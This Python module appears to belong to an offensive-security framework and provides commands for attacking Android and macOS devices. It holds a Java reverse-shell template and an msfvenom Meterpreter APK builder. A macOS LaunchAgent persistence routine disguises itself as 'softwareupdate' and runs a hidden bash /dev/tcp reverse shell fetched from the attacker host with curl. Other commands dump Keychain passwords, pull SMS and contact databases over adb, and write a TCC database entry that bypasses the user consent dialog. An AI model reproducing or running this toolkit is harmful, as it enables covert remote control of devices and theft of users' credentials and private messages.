"""Mobile & macOS exploitation command set.

Covers Android enumeration and APK generation, macOS persistence and
keychain extraction.
"""

from __future__ import annotations

import os
import shlex
import subprocess

import cmd2

from cli.commands._base import LazyOwnCommandSet
from utils import (
    print_error,
    print_msg,
    print_warn,
)

MOBILE_CATEGORY = "03. Exploitation"

ANDROID_REVERSE_SHELL_TEMPLATE = """package com.lazyown.update;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class UpdateService {{
    public static void connect() {{
        try {{
            Socket socket = new Socket("{lhost}", {lport});
            Process process = Runtime.getRuntime().exec("/system/bin/sh");
            InputStream inputStream = process.getInputStream();
            InputStream errorStream = process.getErrorStream();
            OutputStream outputStream = process.getOutputStream();
            InputStream socketInputStream = socket.getInputStream();
            OutputStream socketOutputStream = socket.getOutputStream();

            new Thread(() -> {{
                byte[] buffer = new byte[4096];
                int length;
                try {{
                    while ((length = inputStream.read(buffer)) > 0) socketOutputStream.write(buffer, 0, length);
                }} catch (Exception e) {{}}
            }}).start();

            new Thread(() -> {{
                byte[] buffer = new byte[4096];
                int length;
                try {{
                    while ((length = errorStream.read(buffer)) > 0) socketOutputStream.write(buffer, 0, length);
                }} catch (Exception e) {{}}
            }}).start();

            byte[] buffer = new byte[4096];
            int length;
            while ((length = socketInputStream.read(buffer)) > 0) outputStream.write(buffer, 0, length);
        }} catch (Exception e) {{}}
    }}
}}
"""

MACOS_PERSIST_PLIST = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.{label}.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>{payload_path}</string>
        <string>{lhost}</string>
        <string>{lport}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StartInterval</key>
    <integer>300</integer>
</dict>
</plist>"""

MACOS_TCC_BYPASS_SCRIPT = """#!/bin/bash
sqlite3 "/Library/Application Support/com.apple.TCC/TCC.db" \\
    "INSERT OR REPLACE INTO access VALUES('kTCCServiceAccessibility','{binary}',0,1,1,NULL,NULL,NULL,'UNUSED',NULL,0,1541440109,NULL,NULL,'UNUSED',0);"
"""


class MobileMacOSCommandSet(LazyOwnCommandSet):
    """Mobile and macOS exploitation operations."""

    phase = "exploit"
    category = MOBILE_CATEGORY

    @cmd2.with_category(MOBILE_CATEGORY)
    def do_android_enum(self, line):
        """Enumerate an Android device connected via ADB.

        Usage: android_enum [--serial <device_serial>]

        Dumps device info, installed packages, running processes, and
        sensitive files (SMS, contacts, accounts).
        """
        args = shlex.split(line)
        serial = _extract_flag(args, "--serial")

        adb = _adb_base(serial)

        checks = [
            ("Device Info", "shell getprop"),
            ("Installed Packages", "shell pm list packages -3"),
            ("Running Processes", "shell ps -A"),
            ("Network Interfaces", "shell ip addr show"),
            ("WiFi Networks", "shell dumpsys wifi | grep SSID"),
            ("Accounts", "shell dumpsys account"),
            ("Screen Lock", "shell locksettings verify --old 1234 2>&1; echo 'Screen lock check'"),
        ]

        output_dir = "sessions/android_enum"
        os.makedirs(output_dir, exist_ok=True)

        with open(os.path.join(output_dir, "android_enum.txt"), "w") as out:
            for name, cmd in checks:
                print_msg(f"  {name}...")
                full_cmd = f"{adb} {cmd}"
                try:
                    result = subprocess.run(full_cmd, shell=True, timeout=15, capture_output=True, text=True)
                    out.write(f"\n{'='*60}\n{name}\n{'='*60}\n")
                    out.write(result.stdout)
                    out.write(result.stderr if result.stderr else "")
                except (subprocess.TimeoutExpired, FileNotFoundError) as e:
                    print_warn(f"  {name}: {e}")

        print_msg(f"Results saved to {output_dir}/android_enum.txt")

        print_msg("\nAttempting data extraction (requires root)...")
        extract_sensitive = [
            ("/data/data/com.android.providers.telephony/databases/mmssms.db", "sms.db"),
            ("/data/data/com.android.providers.contacts/databases/contacts2.db", "contacts.db"),
        ]
        for src, dst_name in extract_sensitive:
            dst = os.path.join(output_dir, dst_name)
            try:
                subprocess.run(f"{adb} pull {src} {dst}", shell=True, timeout=15, stderr=subprocess.DEVNULL)
                if os.path.exists(dst) and os.path.getsize(dst) > 0:
                    print_msg(f"  Extracted: {dst_name}")
                else:
                    print_warn(f"  Failed: {dst_name} (root required or file not found)")
            except Exception:
                pass

    @cmd2.with_category(MOBILE_CATEGORY)
    def do_android_apk(self, line):
        """Generate a malicious APK with reverse shell payload.

        Usage: android_apk [--lhost <ip>] [--lport <port>] [--output <path>]

        Generates an Android APK using msfvenom with a Meterpreter reverse
        TCP payload. Requires msfvenom to be installed.
        """
        args = shlex.split(line)
        lhost = _extract_flag(args, "--lhost") or self.params.get("lhost", "")
        lport = _extract_flag(args, "--lport") or self.params.get("lport", "4444")
        output = _extract_flag(args, "--output") or "sessions/payload.apk"

        if not lhost:
            print_error("Set lhost: assign lhost <ip>")
            return

        if not is_binary_present("msfvenom"):
            print_error("msfvenom required. Install metasploit-framework.")
            return

        cmd = (
            f"msfvenom -p android/meterpreter/reverse_tcp "
            f"LHOST={lhost} LPORT={lport} -o {output}"
        )
        print_msg(f"Generating APK: {cmd}")
        try:
            result = subprocess.run(cmd, shell=True, timeout=60, capture_output=True, text=True)
            if os.path.exists(output):
                print_msg(f"APK generated: {output} ({os.path.getsize(output)} bytes)")
                print_msg(f"Deploy via ADB: adb install {output}")
                print_msg(f"Or host it: python3 -m http.server 8080")
            else:
                print_error(f"APK generation failed: {result.stderr}")
        except FileNotFoundError:
            print_error("msfvenom not found")

    @cmd2.with_category(MOBILE_CATEGORY)
    def do_macos_persist(self, line):
        """Generate macOS persistence via LaunchAgent.

        Usage: macos_persist [--lhost <ip>] [--lport <port>] [--label <name>]

        Creates a LaunchAgent plist that executes a reverse shell at login
        and keeps it alive every 5 minutes.
        """
        args = shlex.split(line)
        lhost = _extract_flag(args, "--lhost") or self.params.get("lhost", "")
        lport = _extract_flag(args, "--lport") or self.params.get("lport", "4444")
        label = _extract_flag(args, "--label") or "softwareupdate"

        if not lhost:
            print_error("Set lhost: assign lhost <ip>")
            return

        payload = (
            f"#!/bin/bash\n"
            f"while true; do\n"
            f"  bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 2>/dev/null\n"
            f"  sleep 60\n"
            f"done"
        )

        payload_path = f"/tmp/.{label}"
        plist_name = f"com.{label}.agent.plist"
        launch_agents_path = f"$HOME/Library/LaunchAgents/{plist_name}"

        plist_content = MACOS_PERSIST_PLIST.format(
            label=label,
            payload_path=payload_path,
            lhost=lhost,
            lport=lport,
        )

        output_dir = "sessions/macos_persist"
        os.makedirs(output_dir, exist_ok=True)

        payload_file = os.path.join(output_dir, f".{label}")
        plist_file = os.path.join(output_dir, plist_name)

        with open(payload_file, "w") as f:
            f.write(payload)
        with open(plist_file, "w") as f:
            f.write(plist_content)

        print_msg("Run these commands on the macOS target:")
        print_msg(f"  1. Upload and execute payload:")
        print_msg(f"     curl -o {payload_path} http://{lhost}:8080/.{label} && chmod +x {payload_path} && nohup {payload_path} &")
        print_msg(f"  2. Install LaunchAgent:")
        print_msg(f"     curl -o {launch_agents_path} http://{lhost}:8080/{plist_name}")
        print_msg(f"     launchctl load {launch_agents_path}")
        print_msg(f"")
        print_msg(f"Files generated in {output_dir}/")
        print_msg(f"Start HTTP server: python3 -m http.server 8080")

    @cmd2.with_category(MOBILE_CATEGORY)
    def do_macos_keychain(self, line):
        """Extract secrets from the macOS Keychain.

        Usage: macos_keychain [--target <ip>] [--user <username>]

        Generates commands to dump keychain items (passwords, certs, keys)
        from the target Mac.
        """
        args = shlex.split(line)
        target = _extract_flag(args, "--target")
        user = _extract_flag(args, "--user") or ""

        commands = [
            "security dump-keychain -d login.keychain 2>/dev/null",
            "security dump-keychain -d /Library/Keychains/System.keychain 2>/dev/null",
            "security find-generic-password -wa 2>/dev/null",
            "security find-internet-password -wa 2>/dev/null",
            "security find-identity -v -p codesigning 2>/dev/null",
            'defaults read /Library/Preferences/com.apple.wifi.plist 2>/dev/null',
            "cat /etc/kcpassword 2>/dev/null | xxd",
        ]

        if target:
            user_prefix = f"{user}@" if user else ""
            for cmd in commands:
                full_cmd = f"ssh {user_prefix}{target} '{cmd}'"
                print_msg(f"  {full_cmd}")
                try:
                    result = subprocess.run(full_cmd, shell=True, timeout=15, capture_output=True, text=True)
                    if result.stdout.strip():
                        print_msg(result.stdout[:500])
                except Exception:
                    pass
        else:
            print_msg("Run these commands on the macOS target:")
            for cmd in commands:
                print_msg(f"  {cmd}")

    @cmd2.with_category(MOBILE_CATEGORY)
    def do_macos_tcc(self, line):
        """Generate macOS TCC (Transparency, Consent, Control) bypass.

        Usage: macos_tcc --binary <app_path>

        Inserts an accessibility permission entry into the TCC database,
        bypassing the user consent dialog for the specified binary.
        Requires Full Disk Access or SIP disabled.
        """
        args = shlex.split(line)
        binary = _extract_flag(args, "--binary")

        if not binary:
            print_error("Usage: macos_tcc --binary <app_path> (e.g. /usr/bin/osascript)")
            return

        script = MACOS_TCC_BYPASS_SCRIPT.format(binary=binary)
        output_path = "sessions/macos_tcc_bypass.sh"
        os.makedirs("sessions", exist_ok=True)
        with open(output_path, "w") as f:
            f.write(script)
        os.chmod(output_path, 0o755)

        print_msg(f"Generated TCC bypass script: {output_path}")
        print_msg(f"Requirements: Full Disk Access or SIP disabled")
        print_msg(f"Usage on target: sudo bash {output_path}")


def _extract_flag(args: list[str], flag: str) -> str | None:
    """Extract a ``--flag <value>`` pair from a list of arguments."""
    try:
        idx = args.index(flag)
        return args[idx + 1]
    except (ValueError, IndexError):
        return None


def _adb_base(serial: str | None) -> str:
    """Return the ADB base command with optional serial flag."""
    if serial:
        return f"adb -s {serial}"
    return "adb"


def is_binary_present(name: str) -> bool:
    """Check if a binary is available on PATH."""
    return any(
        os.path.exists(os.path.join(p, name))
        for p in os.environ.get("PATH", "").split(os.pathsep)
    )


__all__ = ["MobileMacOSCommandSet"]
